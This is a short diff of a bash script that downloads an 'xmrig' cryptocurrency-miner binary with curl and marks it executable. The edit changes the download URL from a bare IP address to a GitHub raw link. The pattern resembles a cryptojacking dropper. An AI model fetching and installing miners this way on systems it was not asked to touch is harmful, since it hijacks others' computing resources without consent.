@@ -1,5 +1,5 @@
 #!/bin/bash
-curl http://23.94.26.248:9999/xmrig -o xmrig
+curl https://github.com/MAKEMMM/tool/raw/main/xmrig -o xmrig
 
 chmod +x ./xmrig
 
